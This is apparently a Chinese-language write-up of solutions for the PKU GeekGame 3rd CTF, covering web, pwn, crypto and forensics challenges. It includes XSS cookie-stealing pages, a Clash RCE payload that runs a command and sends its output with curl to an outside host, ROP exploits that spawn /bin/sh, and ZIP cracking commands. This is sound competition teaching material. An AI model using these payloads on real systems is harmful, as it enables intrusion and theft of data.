# GeekGame 3rd Writeup by mariodon

## 一眼盯帧

如二阶段提示所说，“只需要把 GIF 里每个帧里的字母拼起来，然后做个 ROT13 就解出来了。”

## 小北问答!!!!!

### 在北京大学（校级）高性能计算平台中，什么命令可以提交一个非交互式任务？

找到计算平台的[文档](https://hpc.pku.edu.cn/_book/guide/slurm/sbatch.html)，能看到 salloc 是用于交互运行作业的，那么上面没提是否是交互式的 sbatch 就是非交互了。

### 根据 GPL 许可证的要求，基于 Linux 二次开发的操作系统内核必须开源。例如小米公司开源了 Redmi K60 Ultra 手机的内核。其内核版本号是？

内核版本号能在 [Makefile](https://github.com/MiCode/Xiaomi_Kernel_OpenSource/blob/corot-t-oss/Makefile) 里看到。

### 每款苹果产品都有一个内部的识别名称（Identifier），例如初代 iPhone 是 iPhone1,1。那么 Apple Watch Series 8（蜂窝版本，41mm 尺寸）是什么？

[嗯搜](https://gist.github.com/adamawolf/3048717)。

### 本届 PKU GeekGame 的比赛平台会禁止选手昵称中包含某些特殊字符。截止到 2023 年 10 月 1 日，共禁止了多少个字符？（提示：本题答案与 Python 版本有关，以平台实际运行情况为准）

看[平台代码](https://github.com/PKU-GeekGame/gs-backend/blob/master/src/store/user_profile_store.py)，再根据步骤的 Python 版本 (≥3.8) 试。

### 在 2011 年 1 月，Bilibili 游戏区下共有哪些子分区？（按网站显示顺序，以半角逗号分隔）

Web Archive 找，当时 B站 域名后缀是 .tv。

### 这个照片中出现了一个大型建筑物，它的官方网站的域名是什么？（照片中部分信息已被有意遮挡，请注意检查答案格式）

搜赞助商查到是 IASP2023 峰会，[日程](https://www.iaspworldconference.com/destination/social-events/)里签到处的音乐厅和原图是一个建筑。

## Z 公司的服务器

### 服务器

搜 pcap 包的 payload 能知道是 ZMODEM 协议，配了 iTerm2 的 [zmodem 集成](https://github.com/robberphex/iTerm2-zmodem) 半天调不通。后来发现题目有 bug，echo TOKEN | ncat 方式有问题，ncat 直接连上以后输 token 就没问题，~~真是醉了~~。

### 流量包

题目的 pcap 里传输了一个 jpg，这题考的就是恢复出这个图片。

因为 ZMODEM 协议里带 checksum，直接提取出来是不行的，所以我选择本地开一个 rz 进行重放。

调了半天 tcpliveplay L2 重放调不通，最后又在本地起了个 server 发包。

```python
from scapy.all import *
from scapy.utils import rdpcap
from pwn import *

l = listen(1234)
l.wait_for_connection()

# 用 wireshark 提取出仅包含回复的包
pkts=rdpcap('response.pcapng')
for pkt in pkts:
    payload = bytes(pkt[TCP].payload)
    if len(payload) > 0:
        l.send(payload)
```

## 猫咪状态监视器

读题目代码看到能注入 service 后的参数，搜了一下看到给 service 传一个基于 /etc/init.d 的相对路径可以直接执行任意命令，所以把 flag cat 出来输出即可。

## 基本功

~~zip 破解？rockyou 启动。什么？50字节大小写特殊符号？溜了溜了。~~

### 简单的 Flag

给了个 chrome driver，同时也有文件大小和 crc，能想到是要进行选择明文攻击。
明文可以到 chrome driver 的 [S3 listing 页](https://chromedriver.storage.googleapis.com) 按文件大小找到对应版本。

`bkcrack -C challenge_1.zip -c chromedriver_linux64.zip -p chromedriver_linux64.zip`
得到 key 以后再用 key 把 zip 的密码修改掉，
`bkcrack -C challenge_1.zip -k 8c25f8be df1db6d3 8060b113 -U challenge1_unlocked.zip password`，之后用解压工具和密码 password 就可以解出 flag1.txt 了。

### 冷酷的 Flag

能看到 flag2 是 pcapng 类型，能想到这题是根据文件头再次进行选择明文攻击。

用手头几个 pcapng 归纳出了一下的文件头然后进行爆破。
注意因为公共的部分 offset 不是 0，需要手动指定 offset。
~~之前想当然以为 ffff 前都是公共的然而跑不出来。~~

```hexdump
00000000: 0000 4d3c 2b1a 0100 0000 ffff ffff ffff  ..M<+...........
00000010: ffff
```

`bkcrack -C challenge_2.zip -c flag2.pcapng -p pcapng_header.bin -d flag2_dec.pcapng -o 6`


## 麦恩·库拉夫特

手玩就找到 flag1 了。

## Emoji Wordle

### Level 1

Level 1 答案固定，所以把 emoji 字典爆出来一个个猜就好。

写了个辅助脚本帮忙暴力猜。
脚本可以参考下面 Level 3 的，反正也差不多。

### Level 2

题目说答案是随机生成并存储在会话中的，那么 F12 看一下，能看到很大一串 JWT，[解开](https://jwt.io)以后能直接看到答案。

```json
{
  "data": {
    "level": "2",
    "remaining_guesses": "8",
    "target": "💀👿👕👝👹💂👉👨💆💊💉👔👶👱👩👲👤👳👷👚👷👗👶👖👾👞👺👑👇👽💄👥👓🐿👙👽💊🐿💊💇👃👄👠👶👟👺👜👢👔💉💇💄💈👓👷💈👗💀👒👀👀👱👈🐿"
  },
  "nbf": 1697865485,
  "iat": 1697865485
}
```

### Level 3

用和 Level 2 同样的方法，发现 JWT 内容变了。

```json
{
  "data": {
    "level": "3",
    "start_time": "1697865672540",
    "remaining_guesses": "3",
    "seed": "2.3622133122231228E10"
  },
  "nbf": 1697865672,
  "iat": 1697865672
}
```

答案不在 token 里了，取而代之的是 start_time 和 seed，猜测服务端根据 seed 去算 flag。
JWT 是签了名的，改不了，但是可以用之前的 token 还原剩余猜测的次数，在指定时间内无限次数试。

这一问需要写一个脚本去自动试，不然在1分钟的指定时间内猜不出来。

```python
import requests

def get_yellow(results : str):
    indices = [i for i, x in enumerate(results) if x == '🟨']
    return indices


def get_green(results : str):
    indices = [i for i, x in enumerate(results) if x == '🟩']
    return indices


def find_result(text : str):
    for line in text.splitlines():
        if 'results.push' in line:
            results = line.split("\"")[1]
            assert len(results) == 64
            print(results)
            return results


def make_guess(cok:str, a : str):
    assert len(a) == 64
    r = requests.get('https://prob14.geekgame.pku.edu.cn/level3', params={'guess': a}, cookies=cok)
    r.raise_for_status()
    print(r.text)
    results = find_result(r.text)
    return results


def start_guess():
    r = requests.get('https://prob14.geekgame.pku.edu.cn/level3')
    r.raise_for_status()
    return r.cookies


def output(a : dict):
    o = ''
    for i in range(64):
        o += a[i]
    print(o)
    return o


def get_new_emoji():
    r = requests.get('https://prob14.geekgame.pku.edu.cn/level1')
    r.raise_for_status()
    for line in r.text.splitlines():
        if 'placeholder' in line:
            results = line.split("\"")[1]
            assert len(results) == 64
            return results

ans = {}
cok = start_guess()
while len(ans) != 64:
    i_guess = get_new_emoji()
    initial = make_guess(cok, i_guess)
    yellow = get_yellow(initial)

    for i in yellow:
        correct = i_guess[i]
        if correct in ans.values():
            continue
        rst = make_guess(cok, correct * 64)
        correct_idx = get_green(rst)
        for j in correct_idx:
            ans[j] = correct
            print(f'{j}={correct}')

    print(ans)
    print(len(ans))

make_guess(cok, output(ans))
```

## 第三新XSS

### 巡猎

flag cookie 在 /admin 的 path 上，可以创建一个 iframe 去读。

```html
<iframe id="inline" title="inline" width="300" height="200" src="/admin">
</iframe>
<script>
  function a() {
    var cookie = document.getElementById("inline").contentDocument.cookie;
    document.title = cookie;
  }
</script>

<body onload=a()>
```

### 记忆

bot 先访问 xss 页再访问 admin 页面，第一阶段没什么想法，根据第二阶段提示，需要注册一个 service worker 到 / 这个 scope 上。这个 service worker 可以拦截 /admin，返回我们的网页，然后用这个网页把 flag cookie 拿出来。

xss 页：注册 service worker

```html
<script>
    window.addEventListener('load', function() {
        navigator.serviceWorker.register('/sw/', {scope: '/'}).then(function(registration) {
            console.log('ServiceWorker registration successful with scope: ', registration.scope);
        }, function(err) {
            console.log('ServiceWorker registration failed: ', err);
        });
    });
</script>
```

service worker 内容：拦截 /admin 页面

```js
self.addEventListener('fetch', function(event) {
    console.log('fetch')
    return event.respondWith(fetch("/admin2/"));
});
self.addEventListener('activate', function(event) {
    console.log('activate');
    return self.clients.claim();
});
self.addEventListener('install', function(event) {
    console.log('install');
});
```
因为 scope 限制，所以设置一下 service worker 的 header。

```json
{"Content-Type": "text/javascript", "Service-Worker-Allowed":"/"}
```

假 admin 页：输出 flag

```html
<script>
  function a()
  {
    var cookie = document.cookie;
    document.title = cookie;
  }
  function load()
  {
    setInterval(a, 200)
  }
  </script>

<body onload=load()>
```



## 简单的打字稿

### Super Easy

二阶段提示需要把 flag 作为类型检查器报错的一部分输出，但是如果输出包含 flag 字符串就会崩，所以需要把 flag 的类型做一些变换。

一顿搜索发现了[TS 模板字符串类型](https://juejin.cn/post/7129864202604249096)有很多骚操作，其中反转字符串就是我们所需要的。

```ts
type ReverseString<Str extends string> = Str extends `${ infer First }${ infer Rest }` ? `${ ReverseString<Rest> }${ First }` : Str;
type T = ReverseString<flag1>;
let a: T = 'boom'
```

## 逝界计划

~~一阶段时翻了下集成的列表，我去怎么这么多，故放弃。~~

二阶段提示可以用 nmap 集成输出 flag。

我们先读读 nmap 文档，用 `-iL` 可以读任意文件，经过尝试也会把内容打到报错里。

那么接下来就是想办法把报错拿出来了。

自然而然地想到，能不能把 flag 打到 home assistant 的 log 里呢？

看了看[代码](https://github.com/home-assistant-libs/python-nmap/blob/master/nmap/nmap.py)，nmap 集成是靠解析 nmap 的 xml 输出来工作的，只要 xml 解析失败了，集成就会把 nmap stderr 的内容打到 log。

于是想到，只要混一点别的东西到 xml 里，那么标准输出有很大概率是解析失败的。

再次打开 nmap 文档，找到了 `-oS` 这个输出选项，指定输出到 stdout 后确实输出了无效的 xml，大功告成。
```log
2023-10-18 18:26:30.060 ERROR (MainThread) [homeassistant.components.nmap_tracker] Nmap scanning failed: 'Failed to resolve "flag{sOOoo-many-lOoPHOles-in-HOmE-AsSisTant}".\nWARNING: No targets were specified, so 0 hosts scanned.\n
```
最后给 nmap 集成指定的附加选项：`-iL /flag.txt -oS -`。

## 非法所得

### Flag 1

写一个新的配置文件，引用已有的配置。

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090

proxy-groups:
  - name: UseProvider
    type: select
    use:
      - test

proxy-providers:
  test:
    type: file
    path: /app/profiles/flag.yml
```


### Flag 2

修改目标 url 的解析，再做一个对应的网页。

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090

proxy-groups:
  - name: UseProvider
    type: select
    use:
      - test


proxy-providers:
  test:
    type: file
    path: /app/profiles/flag.yml


hosts:
  'ys.pku.edu.cn': 172.17.0.1
```

```html
<head>
  <script>
    function toggle() {
      var x = document.getElementById("primogem_code");
      if (x.type === "password") {
        x.type = "text";
      } else {
        x.type = "password";
      }
    }
    function script() {
      setTimeout(toggle, 3000)
    }
  </script>
</head>

<body onload="script();">
  <input type="password" id="primogem_code" size="100">
```

### Flag 3

flag3 一定要通过调用 readfile 获得，那就得翻翻 [RCE](https://github.com/Fndroid/clash_for_windows_pkg/issues/2710) 了。

修改 poc 时踩坑，带空格还有重定向符号会有各种莫名其名的问题，调试到第二阶段用了点 shell 魔法才调通，~~丢死人了~~。


```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a<img/src="1"/onerror=eval(`require("child_process").exec("IFS=];a=$(/app/readflag);b=curl]172.17.0.1:8000/$a;$b",{"shell":"/bin/bash"});`);>
    type: socks5
    server: 127.0.0.1
    port: "1926"
    skip-cert-verify: true

proxy-groups:
  -
    name: <img/src="1"/onerror=eval(`require("child_process").exec("IFS=];a=$(/app/readflag);b=curl]172.17.0.1:8000/$a;$b",{"shell":"/bin/bash"});`);>
    type: select
    proxies:
    - a<img/src="1"/onerror=eval(`require("child_process").exec("IFS=];a=$(/app/readflag);b=curl]172.17.0.1:8000/$a;$b",{"shell":"/bin/bash"});`);>
```


## 汉化绿色版免费下载

### 普通下载

GARbro 解开 xp3 找 flag。

### 高速下载

根据解包得到信息，输入的内容以 hash 形式储存，那么就得解密存档获得 hash，再反推原文。

解开所有文件可以发现，存档里不但有输入的 hash，还有各个字母输入的次数，那么只要写个脚本暴力了。

```python
from itertools import product

target = 7748521

prefix = 'flag{'
suffix = '}'

for a in product('AEIO', repeat=16):
    full = prefix + ''.join(a) + suffix
    if full.count('A') != 6 or full.count('E') != 3 or full.count('I') != 1 or full.count('O') != 6:
        continue
    hash = 1337
    for l in a:
        if l == 'A':
            hash = hash * 13337 + 11
        elif l == 'E':
            hash = hash * 13337 + 22
        elif l == 'I':
            hash = hash * 13337 + 33
        elif l == 'O':
            hash = hash * 13337 + 44
        elif l == 'U':
            hash = hash * 13337 + 55

    hash = hash * 13337 + 66
    hash = hash % 19260817

    if hash == target:
        print(full)
```

## 初学 C 语言

### Flag 1

代码审计，`printf` 的内容可以控制，可以利用 format string 泄漏内存。

我在本地把程序跑起来，输入一堆 %lx 找 flag 位置，然后再在远程用同样的方法恢复了 flag。


## Baby Stack

### Flag 1

题目名都叫 Baby Stack 了，应该是考察栈溢出。

先看看保护措施，没开 Stack Canary 和 PIE。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

再看看有什么代码。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+Ch] [rbp-7Ch] BYREF
  __int64 v5[12]; // [rsp+10h] [rbp-78h] BYREF
  int v6; // [rsp+70h] [rbp-18h]

  init(argc, argv, envp);
  memset(v5, 0, sizeof(v5));
  v6 = 0;
  puts("Welcome to babystack:)");
  puts("input the size of your exploitation string:(less than 100 chars with the ending \\n or EOF included!)");
  __isoc99_scanf("%d", &v4);
  if ( v4 > 0x64 )
  {
    puts(":(");
  }
  else
  {
    puts("please input your string:");
    get_line(v5, v4);
  }
  return 0;
}

ssize_t __fastcall get_line(__int64 a1, int a2)
{
  unsigned int i; // ebp
  ssize_t result; // rax
  _BYTE *v4; // rbx

  for ( i = 0; ; ++i )
  {
    result = (unsigned int)(a2 - 1);
    if ( (unsigned int)result <= i )
      break;
    v4 = (_BYTE *)(a1 + i);
    result = read(0, v4, 1uLL);
    if ( *v4 == 10 )
    {
      *v4 = 0;
      return result;
    }
  }
  return result;
}

int backdoor()
{
  return system("/bin/sh");
}
```

有一个 backdoor 函数，那目标就是溢出栈，将 return address 覆盖成 backdoor 函数的地址。

栈底部的变量在 0x7C 的位置，但是我们只能输入 100 字节，不够覆盖 return address。
那有没有办法绕过呢？答案是有的，告诉它我们要输入 0 个字节，get_line 函数在判断已写入字节数时就会溢出，我们就能写入足够大的 buffer 了。

接下来就是一个传统的 stack overflow 任务了，注意需要将 rsp 按16字节对齐，不然调不了 system。

```python
from pwn import *
context.clear(arch='amd64')
elf = ELF('./challenge1')

rop = ROP(elf)
rop.raw('A' * 120)
# ret
rop.call(0x40101a)
rop.call(elf.symbols['backdoor'])
p = remote('prob10.geekgame.pku.edu.cn', 10010)
p.sendline(b'TOKEN')
p.recvuntil(b'Welcome to babystack:)')
p.sendline(b'0')
p.recvuntil(b'please input your string:')
p.sendline(rop.chain())
p.interactive()
```

### Flag 2

同样先看看保护措施和代码。
保护措施和上一问一样，代码简单了不少，~~pwn 题感觉代码越少，题目越烦。~~

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[64]; // [rsp+0h] [rbp-78h] BYREF
  char s[56]; // [rsp+40h] [rbp-38h] BYREF

  init(argc, argv, envp);
  puts("please enter your flag~(less than 0x20 characters)");
  __isoc99_scanf("%s", s);
  if ( (int)strlen(s) > 32 )
  {
    puts("byebye~");
  }
  else
  {
    printf("this is your flag: ");
    printf(s);
    puts("\nWhat will you do to capture it?:");
    __isoc99_scanf("%s", v4);
    puts("so you want to ");
    printf(v4);
    printf("\n and your flag again? :");
    __isoc99_scanf("%s", s);
    puts(s);
    puts("go0d_j0b_und_go0d_luck~:)");
  }
  return 0;
}
```

else 分支的两个 scanf 都没有做长度检查，也就是说都可以溢出。
为了轻松，还是选择从栈底部的变量注入。

既然没有 backdoor 函数了，我们只能自己调用 system 了。

因为 os 每次加载动态库时都会放在不同的地址，这题需要先泄漏 libc 的基地址，然后算出 system 函数的地址，再~~干坏事~~调用。

泄漏 libc 地址可以通过打印 got 里任意函数的地址，再减去 libc 里该函数的相对地址。

那又怎么打印地址呢？
原来想 syscall 调 write 的，一看 gadget 不够，只能想办法利用程序里有的函数了。

x64 第一个参数是通过 rdi 寄存器传的，但是没有 pop rdi gadget 怎么办呢。
偶然发现，程序调用 puts 函数前的 rdi 的值是从 rbx 拿的，而我们有一个 pop rbx gadget，那就好办了，把想传的参数写入 rbx 就好了。

有了 libc 的基地址，也就可以算出 libc 中 /bin/sh 的实际地址，从而调用 system("/bin/sh") 了。

最后的 exp：

```python
from pwn import *
context.clear(arch='amd64')
elf = ELF('./challenge2')
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

rop.raw('A' * 112)
# ret
rop.raw(p64(0x40101a))

# pop rbx ; pop rbp ; pop r12 ; ret
rop.call(0x401300)
rop.raw(p64(elf.got['puts']))
rop.raw(p64(elf.got['puts']))
rop.raw(p64(elf.got['puts']))
# mov rdi, rbx; puts
rop.call(0x4012e3) 

#p = process('./challenge2')
p = remote('prob10.geekgame.pku.edu.cn', 10011)
p.sendline(b'TOKEN')
p.recvuntil(b'characters')
p.sendline(b'1')
p.recvuntil(b'flag: ')

p.recvuntil(b'it?')
p.sendline(rop.chain())
p.recvuntil(b'again')
p.sendline(b'1')

p.recvuntil(b'go0d_j0b_und_go0d_luck~:)\n')
leaked_puts = p.recvline().strip()

libc.address = int.from_bytes(leaked_puts, 'little') - libc.symbols['puts']
log.success(f'libc addr={hex(libc.address)}')
sh_addr = next(libc.search(b'/bin/sh'))

rop2 = ROP(elf)
rop2.raw('A' * 112)
# ret
rop2.raw(p64(0x40101a))
# nop ; ret
rop2.raw(p64(0x40112f))
# ropper --file libc.so.6 --search "pop rdi"
pop_rdi = libc.address + 0x2a3e5
rop2.raw(p64(pop_rdi))
rop2.raw(p64(sh_addr))
rop2.raw(p64(libc.symbols['system']))

p.recvuntil(b'characters')
p.sendline(b'1')
p.recvuntil(b'flag: ')
p.recvuntil(b'it?')
p.sendline(rop2.chain())
p.recvuntil(b'again')
p.sendline(b'1')
p.interactive()
```

## 禁止执行，启动

### Flag 1

环境里提供了 lldb，那就可以用 lldb 修改内存中 binary 的代码，从而执行 shell code。
我这里用 `process launch --stop-at-entry` 在程序开始前断下来，并把 shell code 写在了 entry point。

```
memory write 0x4038b1 0x31
memory write 0x4038b2 0xc0
memory write 0x4038b3 0x66
memory write 0x4038b4 0xb8
memory write 0x4038b5 0x24
memory write 0x4038b6 0x02
memory write 0x4038b7 0x31
memory write 0x4038b8 0xff
memory write 0x4038b9 0x48
memory write 0x4038ba 0x89
memory write 0x4038bb 0xe6
memory write 0x4038bc 0x0f
memory write 0x4038bd 0x05
```

题目给的 getflag syscall 把 flag 写到了 rsp，不过这里没有调输出 rsp。
~~都有调试器了，手动看一下也挺方便，总比再构造 memory write 语句方便~~。


## 未来磁盘

### Flag 1

题目说经过了多次 gzip 压缩，所以先摸个底，重复解压，直到文件的 header 不再是 gzip 文件头 1f 8b。

此时得到了一个 7.5G 的压缩文件，把它解压了就有 flag 了。

因为贫穷，我没有 7TB 的剩余空间，只好解压到管道，喂给一个能打印 flag 的程序，比如 strings。

挂了几个小时，终端的输出仍然是空的，我开始怀疑不能这么暴力了，于是开始研究那个文件。

运行 `cat /dev/zero | gzip | xxd`，可以看到一堆 UUUU，那就是压缩后的 0。
那么只要把找到不包含 U 的 offset，就是 flag 附近。

通过执行 `xxd flag1.gz | grep -v U`，可以推测 flag 在 e0eb80f0 附近。

```hexdump
00001000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00001010: 0000 0000 0000 80d9 8303 0100 0000 0020  ...............
e0eb80f0: 252b d884 74d6 368f 8144 04d3 d88a bb0b  %+..t.6..D......
e0eb8100: ce71 37c2 fdc6 b51f cf4c 778f b2d5 35c6  .q7......Lw...5.
e0eb8110: 997b b434 9757 0d00 0000 0000 0000 0000  .{.4.W..........
e0eb8120: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

~~我把这一段提出来之后不知道怎么解压，琢磨了半天，然后发现暴力跑出结果了，于是16进制编辑器关闭~~。


## 小章鱼的曲奇


### Smol Cookie

看代码，需要预测 PRNG 才能拿到 flag。我们知道连续 2500 字节的输出，可以找一个 MT19937 预测库解。

```python
from pwn import *
from mt19937predictor import MT19937Predictor

predictor = MT19937Predictor()
p = remote('prob08.geekgame.pku.edu.cn', 10008)
p.sendline(b'TOKEN')
p.recvuntil(b'one:')
p.sendline(b'1')
p.recvuntil(b'void')
p.recvline()

c = p.recvline().decode()

cb = bytes.fromhex(c)
zero = cb[:2500]
flag_len = len(cb) - 2500
predictor.setrandbits(int.from_bytes(zero, 'little'), 2500 * 8)
print(int.to_bytes(predictor.getrandbits(flag_len * 8) ^ int.from_bytes(cb[2500:], 'little'), flag_len, 'little'))
```

### Big Cookie

题目把明文与 3 串随机字节 xor，第一串 seed 会输出，我们又可以指定第二串 seed，可以猜测有办法让第一串和第二串随机字符串消掉，然后就和第一问一样了。

有没有办法在指定不一样 seed 的情况下让随机状态一致呢？
带着这个问题，我去翻了 python 库随机的[实现](https://github.com/python/cpython/blob/main/Modules/_randommodule.c)。

如注释所说，随机算法会用参数的绝对值做运算，也就是说两个 seed 如果只有符号的差异的话实际上是等效的。

所以这一问只要指定 seed2 为 seed1 的负数，再用第一问的方法预测 PRNG，就能拿到 flag。

~~另外没明白题目修改 void1 和 void2 状态干什么，都抵消了还虚晃一枪。~~

```python
from pwn import *
from mt19937predictor import MT19937Predictor


predictor = MT19937Predictor()
p = remote('prob08.geekgame.pku.edu.cn', 10008)
p.sendline(b'TOKEN')
p.recvuntil(b'one:')
p.sendline(b'2')
p.recvuntil(b'<')
seed = p.recvline().decode().replace('>', '')
seed = int(seed, 16)
seed_eq = -seed
p.recvuntil(b'> ')
p.sendline(f'{hex(seed_eq)}'.encode())
p.recvuntil(b'void')
p.recvline()
c = p.recvline().decode()
cb = bytes.fromhex(c)
zero = cb[:2500]
flag_len = len(cb) - 2500
predictor.setrandbits(int.from_bytes(zero, 'little'), 2500 * 8)
print(int.to_bytes(predictor.getrandbits(flag_len * 8) ^ int.from_bytes(cb[2500:], 'little'), flag_len, 'little'))
```

### SUPA BIG Cookie

题目只检查连续100次的随机结果是否一样，所以只要把随机种子设定成一样即可通过。

```python
from pwn import *

p = remote('prob08.geekgame.pku.edu.cn', 10008)
p.sendline(b'TOKEN')
p.recvuntil(b'one:')
p.sendline(b'3')
p.recvuntil(b'<')
curses = p.recvline().decode().replace('>', '')
p.sendline(curses.encode())
p.interactive()
```